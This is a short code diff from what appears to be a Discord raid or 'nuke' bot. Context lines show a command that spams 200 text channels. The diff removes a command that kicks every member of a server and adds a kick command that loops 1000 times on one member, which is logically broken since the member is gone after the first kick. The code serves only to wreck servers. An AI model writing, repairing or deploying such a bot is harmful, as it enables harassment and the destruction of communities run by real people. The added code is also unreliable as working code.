@@ -36,17 +36,11 @@ async def create(ctx):
      for i in range(200):
         await ctx.guild.create_text_channel("튀엣")
         
-@client.command(pass_context=True)
-async def kick(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.kick(member)
-            print (f"{member.name} has been kicked")
-        except:
-            print (f"{member.name} has FAILED to be kicked")
-        print ("Action completed: Kick all")
+@client.command()
+async def kick(ctx, member: discord.Member, *, reason=None):
+     for i in range(1000):
+        await member.kick(reason=reason)
+        await ctx.send(f'User {member} has kicked.')
         
 @client.command()
 async def cmd(ctx):
